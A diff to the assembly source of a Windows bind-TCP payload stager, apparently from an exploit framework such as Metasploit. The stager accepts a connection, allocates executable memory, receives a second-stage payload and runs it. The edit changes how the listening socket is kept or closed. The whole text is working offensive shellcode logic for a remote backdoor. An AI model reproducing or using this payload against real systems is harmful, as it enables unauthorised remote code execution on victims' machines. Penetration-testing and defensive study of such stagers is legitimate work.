@@ -167,19 +167,14 @@ module Payload::Windows::BindTcp
         push edi               ; listening socket
         push 0xE13BEC74        ; hash( "ws2_32.dll", "accept" )
         call ebp               ; accept( s, 0, 0 );
-      ^
 
+        push edi               ; push the listening socket, either to close, or to pass on
+        xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
+      ^
       if close_socket
         asm << %Q^
-          push edi               ; push the listening socket to close
-          xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
           push 0x614D6E75        ; hash( "ws2_32.dll", "closesocket" )
           call ebp               ; closesocket( s );
-        ^
-      else
-        asm << %Q^
-          push edi               ; store the listen socket to pass through to the second stage
-          xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
         ^
       end
 
@@ -213,8 +208,23 @@ module Payload::Windows::BindTcp
         call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
         ; Receive the second stage and execute it...
         xchg ebx, eax          ; ebx = our new memory address for the new stage
+      ^
+      unless close_socket
+        asm << %Q^
+          pop eax              ; listen socket needs to be saved
+        ^
+      end
+      asm << %Q^
         push ebx               ; push the address of the new stage so we can return into it
+      ^
 
+      unless close_socket
+        asm << %Q^
+          push eax             ; and push the listen socket up again
+        ^
+      end
+
+      asm << %Q^
       read_more:               ;
         push 0                 ; flags
         push esi               ; length
@@ -237,7 +247,7 @@ module Payload::Windows::BindTcp
         sub esi, eax           ; length -= bytes_received, will set flags
         jnz read_more          ; continue if we have more to read
         ^
-      if close_socket
+      unless close_socket
         asm << %Q^
           pop esi                ; put the listen socket in esi
           ^
